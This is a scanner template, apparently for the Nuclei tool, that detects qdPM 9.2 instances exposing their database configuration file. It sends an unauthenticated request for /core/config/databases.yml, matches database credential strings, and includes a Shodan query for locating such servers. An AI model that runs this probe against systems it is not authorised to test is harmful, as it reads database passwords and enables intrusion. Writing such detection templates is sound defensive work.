id: qdpm-exposure

info:
  name: qdPM 9.2 - Password Exposure (Unauthenticated)
  author: arafatansari
  severity: medium
  description: |
    qdPM 9.2 is vulnerable to DB Connection String and Password Exposure (Unauthenticated).
  reference:
    - https://www.exploit-db.com/exploits/50176
  metadata:
    shodan-query: http.html:"qdpm"
    verified: "true"
  tags: unauth,exposure,exploitdb

requests:
  - raw:
      - |
        GET /core/config/databases.yml HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "sfDoctrineDatabase"
          - "mysql:dbname"
        condition: and
